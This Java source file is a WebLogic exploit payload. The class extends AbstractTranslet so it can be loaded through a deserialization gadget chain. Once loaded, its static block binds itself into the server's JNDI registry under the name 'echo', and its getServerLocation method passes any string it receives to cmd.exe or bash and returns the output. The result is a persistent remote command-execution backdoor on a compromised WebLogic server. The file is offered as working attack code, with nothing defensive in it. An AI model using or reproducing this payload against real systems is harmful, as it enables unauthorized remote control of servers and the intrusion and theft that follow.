package com.Jasetol.payloads.weblogic;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import weblogic.cluster.singleton.ClusterMasterRemote;

import javax.naming.InitialContext;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.rmi.RemoteException;

public class RMIForecho extends AbstractTranslet implements ClusterMasterRemote {

    static {
        try {
            InitialContext initialContext = new InitialContext();
            initialContext.rebind("echo",new RMIForecho());
        }catch (Exception e){}
    }

    @Override
    public String getServerLocation(String s) throws RemoteException {
        try{
            String osName = System.getProperty("os.name");
            String[] cmd = osName != null && osName.toLowerCase().contains("win") ? new String[]{"cmd.exe","/c",s} : new String[]{"/bin/bash","-c",s};
            InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
            byte[] bytes = new byte[1024];
            int len = 0;
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            while ((len = inputStream.read(bytes)) != -1){
                byteArrayOutputStream.write(bytes,0,len);
            }
            return new String(byteArrayOutputStream.toByteArray());
        }catch (Exception e){}
        return null;
    }

    @Override
    public void setServerLocation(String s, String s1) throws RemoteException {

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
